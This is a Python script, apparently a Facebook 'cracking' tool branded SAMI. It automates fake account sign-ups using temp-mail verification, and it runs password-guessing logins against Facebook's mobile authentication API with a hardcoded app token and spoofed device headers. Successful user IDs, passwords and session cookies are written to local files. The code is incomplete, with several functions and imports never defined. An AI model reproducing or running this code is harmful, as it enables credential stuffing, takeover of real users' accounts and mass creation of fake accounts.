from faker import Faker
from fake_email import Email
from bs4 import BeautifulSoup

W = "\x1b[97m"
G = "\x1b[38;5;46m"
R = "\x1b[38;5;196m"
X = f"{W}<{R}[•]{W}>"

oks = []
cps = []

from fake_useragent import UserAgent
ua = UserAgent()
def ugenX():
    ualist = [ua.random for _ in range(50)]
    return str(random.choice(ualist))

def fake_name():
    first = Faker().first_name()
    last = Faker().last_name()
    return first,last

def extractor(data):
    try:
        soup = BeautifulSoup(data,"html.parser")
        data = {}
        for inputs in soup.find_all("input"):
            name = inputs.get("name")
            value = inputs.get("value")
            if name:
                data[name] = value
        return data
    except Exception as e:
        return {"error":str(e)}

def GetEmail():
    response = requests.post('https://api.internal.temp-mail.io/api/v3/email/new').json()
    return response['email']

def GetCode(email):
    try:
        response = requests.get(f'https://api.internal.temp-mail.io/api/v3/email/{email}/messages').text
        code = re.search(r'FB-(\d+)', response).group(1)
        return code
    except:
        return None



def auto() -> None:
    
    input(f"{X} ENTER START CRACKING ....")
    linex()
    for make in range(100):
        ses = requests.Session()
        response = ses.get(
            url='https://x.facebook.com/reg',
            params={"_rdc":"1","_rdr":"","wtsid":"rdr_0t3qOXoIHbMS6isLw","refsrc":"deprecated"},
        )
        mts = ses.get("https://x.facebook.com").text
        m_ts = re.search(r'name="m_ts" value="(.*?)"',str(mts)).group(1)
        formula = extractor(response.text)
        email2 = GetEmail()
        firstname,lastname = fake_name()
        print(f"{X} NAME  - {G}{firstname} {lastname}")
        print(f"{X} EMAIL - {G}{email2}")
        payload = {
            'ccp': "2",
            'reg_instance': str(formula["reg_instance"]),
            'submission_request': "true",
            'helper': "",
            'reg_impression_id': str(formula["reg_impression_id"]),
            'ns': "1",
            'zero_header_af_client': "",
            'app_id': "103",
            'logger_id': str(formula["logger_id"]),
            'field_names[0]': "firstname",
            'firstname': firstname,
            'lastname': lastname,
            'field_names[1]': "birthday_wrapper",
            'birthday_day': str(random.randint(1,28)),
            'birthday_month': str(random.randint(1,12)),
            'birthday_year': str(random.randint(1992,2009)),
            'age_step_input': "",
            'did_use_age': "false",
            'field_names[2]': "reg_email__",
            'reg_email__': email2,
            'field_names[3]': "sex",
            'sex': "2",
            'preferred_pronoun': "",
            'custom_gender': "",
            'field_names[4]': "reg_passwd__",
            'name_suggest_elig': "false",
            'was_shown_name_suggestions': "false",
            'did_use_suggested_name': "false",
            'use_custom_gender': "false",
            'guid': "",
            'pre_form_step': "",
            'encpass': '#PWD_BROWSER:0:{}:{}'.format(str(time.time()).split('.')[0],"MrCode@123"),
            'submit': "Sign Up",
            'fb_dtsg': "NAcMC2x5X2VrJ7jhipS0eIpYv1zLRrDsb5y2wzau2bw3ipw88fbS_9A:0:0",
            'jazoest': str(formula["jazoest"]),
            'lsd': str(formula["lsd"]),
            '__dyn': "1ZaaAG1mxu1oz-l0BBBzEnxG6U4a2i5U4e0C8dEc8uwcC4o2fwcW4o3Bw4Ewk9E4W0pKq0FE6S0x81vohw5Owk8aE36wqEd8dE2YwbK0iC1qw8W0k-0jG3qaw4kwbS1Lw9C0le0ue0QU",
            '__csr': "",
            '__req': "p",
            '__fmt': "1",
            '__a': "AYkiA9jnQluJEy73F8jWiQ3NTzmH7L6RFbnJ_SMT_duZcpo2yLDpuVXfU2doLhZ-H1lSX6ucxsegViw9lLO6uRx31-SpnBlUEDawD_8U7AY4kQ",
            '__user': "0"
        }
        header1 = {
            "Host":"m.facebook.com",
            "Connection":"keep-alive",
            "Upgrade-Insecure-Requests":"1",
            "User-Agent":ugenX(),
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "dnt":"1",
            "X-Requested-With":"mark.via.gp",
            "Sec-Fetch-Site":"none",
            "Sec-Fetch-Mode":"navigate",
            "Sec-Fetch-User":"?1",
            "Sec-Fetch-Dest":"document",
            "dpr":"1.75",
            "viewport-width":"980",
            "sec-ch-ua":"\"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
            "sec-ch-ua-mobile":"?1",
            "sec-ch-ua-platform":"\"Android\"",
            "sec-ch-ua-platform-version":"\"\"",
            "sec-ch-ua-model":"\"\"",
            "sec-ch-ua-full-version-list":"",
            "sec-ch-prefers-color-scheme":"dark",
            "Accept-Encoding":"gzip, deflate, br, zstd",
            "Accept-Language":"en-GB,en-US;q=0.9,en;q=0.8"
        }
        reg_url = "https://m.facebook.com/reg/submit/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM0NDE0OTk2LCJjYWxsc2l0ZV9pZCI6OTA3OTI0NDAyOTQ4MDU4fQ%3D%3D&multi_step_form=1&skip_suma=0&shouldForceMTouch=1"
        py_submit = ses.post(reg_url, data=payload, headers=header1)
        #print(ses.cookies.get_dict().items())
        if "c_user" in py_submit.cookies:
            first_cok = ses.cookies.get_dict()
            uid = str(first_cok["c_user"])
            header2 = {
                'authority': 'x.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                'cache-control': 'max-age=0',
                'dpr': '2',
                'referer': 'https://m.facebook.com/login/save-device/',
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="125", "Google Chrome";v="125"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': ugenX(),
                'viewport-width': '980',      
            }
            params = {
                'next': 'https://x.facebook.com/?deoia=1',
                'soft': 'hjk',
            }
            con_sub = ses.get('https://x.facebook.com/confirmemail.php', params=params, headers=header2).text
            valid = GetCode(email2)
            if valid:
                print(f"{X} FB UID - {G}{uid}")
                print(f"{X} LOGIN OTP - {G}{valid}")
                confirm_id(email2,uid,valid,con_sub,ses)
            else:
                print(f"{X} \x1b[38;5;206mSUCCESSFULLY DISABLED ID")
                linex()
        else:
            print(f"{X} {R}SUCCESSFULLY CHECKPOINT ID")
            linex()

def confirm_id(mail,uid,otp,data,ses):
    try:
        url = "https://masic.facebook.com/confirmation_cliff/"
        params = {
        'contact': mail,
        'type': "submit",
        'is_soft_cliff': "false",
        'medium': "email",
        'code': otp}
        payload = {
        'fb_dtsg': 'NAcMC2x5X2VrJ7jhipS0eIpYv1zLRrDsb5y2wzau2bw3ipw88fbS_9A:0:0',
        'jazoest': re.search(r'"\d+"', data).group().strip('"'),
        'lsd': re.search('"LSD",\[\],{"token":"([^"]+)"}',str(data)).group(1),
        '__dyn': "",
        '__csr': "",
        '__req': "4",
        '__fmt': "1",
        '__a': "",
        '__user': uid}
        headers = {
        'User-Agent': ugenX(),
        'Accept-Encoding': "gzip, deflate, br, zstd",
        'sec-ch-ua-full-version-list': "",
        'sec-ch-ua-platform': "\"Android\"",
        'sec-ch-ua': "\"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
        'sec-ch-ua-model': "\"\"",
        'sec-ch-ua-mobile': "?1",
        'x-asbd-id': "129477",
        'x-fb-lsd': "KnpjLz-YdSXR3zBqds98cK",
        'sec-ch-prefers-color-scheme': "light",
        'sec-ch-ua-platform-version': "\"\"",
        'origin': "https://masic.facebook.com",
        'x-requested-with': "mark.via.gp",
        'sec-fetch-site': "same-origin",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://masic.facebook.com/confirmemail.php?next=https%3A%2F%2Fm.facebook.com%2F%3Fdeoia%3D1&soft=hjk",
        'accept-language': "en-GB,en-US;q=0.9,en;q=0.8",
        'priority': "u=1, i"}
        response = ses.post(url, params=params, data=payload, headers=headers)
        if "checkpoint" in str(response.url):
            print(f"{X}{R} FUCKED ID DISABLED")
            linex()
        else:
            cookie = (";").join([ "%s=%s" % (key,value) for key,value in ses.cookies.get_dict().items()])
            print(f"{X} SUCCESS - {G}{uid}|SAMI@123|{cookie}")
            open("/sdcard/SUCCESS-OK-ID.txt","a").write(uid+"|SAMI@123|"+cookie+"\n")
            linex()
    except Exception as e:
        linex()
        pass
        
def random_method2(uid, pww, total_idz):
    global loop
    global okacc
    global cpacc
    sys.stdout.write(f"\r {w}[SAMI-M2] [{loop}/{total_idz}] [OK/{len(okacc)}]\r"),
    sys.stdout.flush()
    try:
        for pw in pww:
            session = requests.Session()
            device = random.choice(devices)
            secure = str(uuid.uuid4())
            ua_string = "Dalvik/2.1.0 (Linux; U; Android 11.0.0; SM-A205F Build/RP1A.200720.012) [FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957647;FBDM/{density=2.0,width=720,height=1406};FBLC/ru_RU;FBRV/334763932;FBCR/MTS RUS;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1906;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
            data = {
                'adid':secure,
                'format':'json',
                'device':device,
                'device_id':secure,
                'email':uid,
                'password':pw,
                "logged_out_id": secure,
                "hash_id": secure,
                "reg_instance": secure,
                "session_id": secure,
                "advertiser_id": secure,
                'generate_analytics_claims':'1',
                'credentials_type':'password',
                'source':'login',
                "sim_country": "id",
                "network_country": "id",
                "relative_url": "method/auth.login",
                'error_detail_type':'button_with_disabled',
                'enroll_misauth':'false',
                'generate_session_cookies':'1',
                'generate_machine_id':'1',
                "locale":"en_US","client_country_code":"US",
                'fb_api_req_friendly_name':'authenticate',
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            }
            accessToken="350685531728|62f8ce9f74b12f84c123cc23437a4a32"
            headers = {
                'Authorization':f'OAuth {accessToken}',
                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                'X-FB-Friendly-Name':'authenticate',
                'X-FB-Connection-Type':'unknown',
                'User-Agent':SAMI(),
                'Accept-Encoding':'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger',
            }
            url = "https://b-graph.facebook.com/auth/login"
            data_json = session.post(url, data=data, headers=headers).json()
            if "session_key" in data_json:
                try:
                    uid = data_json["uid"]
                except:
                    uid = uid
                coki = ";".join(i["name"]+"="+i["value"] for i in data_json["session_cookies"])
                print(f" {g}[SAMI-OK] {uid} | {pw}")
                print(f" {w}[Cookies] > {g}{coki} ")
                open("/sdcard/SAMI-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                okacc.append(uid)
                check_apk(session,coki)
                break
            elif "www.facebook.com" in data_json["error"]["message"]:
                try:
                    uid = data_json["error"]["error_data"]["uid"]
                except:
                    uid = uid
                print(f" {p}[SAMI-CP] {uid} | {pw}")
                open("/sdcard/SAMI-CP.txt", "a").write(f"{uid}|{pw}\n")
                cpacc.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        time.sleep(10)

def random_method3(uid, pww, total_idz):
    global loop
    global okacc
    global cpacc
    sys.stdout.write(f"\r {w}[SAMI-M3] [{loop}/{total_idz}] [OK/{len(okacc)}]\r"),
    sys.stdout.flush()
    try:
        for pw in pww:
            ua_string = "Dalvik/2.1.0 (Linux; U; Android 11.0.0; SM-A205F Build/RP1A.200720.012) [FBAN/FB4A;FBAV/387.0.0.5.168;FBBV/553336093;FBDM/{density=2.2,width=1080,height=1442};FBLC/ it_IT;FBRV/432678052;FBCR/Jazz;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2004J19C;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': uid,
                'password': pw,
                'generate_analytics_claims': '1',
                'community_id': '',
                'cpl': 'true',
                'try_num': '1',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'currently_logged_in_userid': '0',
                'locale': 'en_GB',
                'client_country_code': 'GB',
                'fb_api_req_friendly_name': 'authenticate',
            }
            headers = {
                'User-Agent': SAMI(),
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'Connection': 'keep-alive',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Connection-Bandwidth': str(random.randint(21000,41000)),
                'X-FB-Net-HNI': str(random.randint(21000,41000)),
                'X-FB-SIM-HNI': str(random.randint(21000,41000)),
                'X-FB-Connection-Type': 'unknown',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger',
            }
            url = "https://b-graph.facebook.com/auth/login"
            data_json = requests.post(url, data=data, headers=headers).json()
            if "session_key" in data_json:
                try:
                    uid = data_json["uid"]
                except:
                    uid = uid
                coki = ";".join(i["name"]+"="+i["value"] for i in data_json["session_cookies"])
                print(f"{g}[SAMI-OK] {uid} | {pw}")
                print(f"\033[1;92m[COOKIES]…[ 🍪 ]  {g}{coki} ")
                open("/sdcard/SAMI-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                okacc.append(uid)
                check_apk(session,coki)
                break
            elif "www.facebook.com" in data_json["error"]["message"]:
                try:
                    uid = data_json["error"]["error_data"]["uid"]
                except:
                    uid = uid
                print(f"{w}[SAMI-CP] {uid} | {pw}")
                open("/sdcard/SAMI-CP.txt", "a").write(f"{uid}|{pw}\n")
                cpacc.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        time.sleep(10)

banner = f"""\x1b[1;97m
\033[1;32m 

   \033[1;31m  .d8888b.        d8888 888b     d888 8888888 
   \033[1;31m d88P  Y88b      d88888 8888b   d8888   888   
   \033[1;31m Y88b.          d88P888 88888b.d88888   888   
   \033[1;37m  "Y888b.      d88P 888 888Y88888P888   888   
   \033[1;37m     "Y88b.   d88P  888 888 Y888P 888   888   
   \033[1;32m       "888  d88P   888 888  Y8P  888   888   
   \033[1;32m Y88b  d88P d8888888888 888   "   888   888   
     \033[1;32m"Y8888P" d88P     888 888       888 8888888 SAMI BRAND 😈
\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━•
\033[1;37m[•] AUTHOR     : \033[1;32mSAMI KHAN\033[1;37m
\033[1;37m[•] GITHUB     : \033[1;32mSAMI -JANI\033[1;37m
\033[1;37m[•] TOOL NAME  : \033[1;32mSAMI\033[1;37m
\033[1;37m[•] TOOL TYPE  : \033[1;32mRANDOM\033[1;37m
\033[1;37m[•] STATUS     : \033[1;32mFREE\033[1;37m
\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━•
\033[1;37m[•] \033[1;37mVERSION    :\033[1;32m 1.0 \033[1;37m"DON'T WORRY FOR UPDATES!"\033[1;37m
\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━•"""

main()
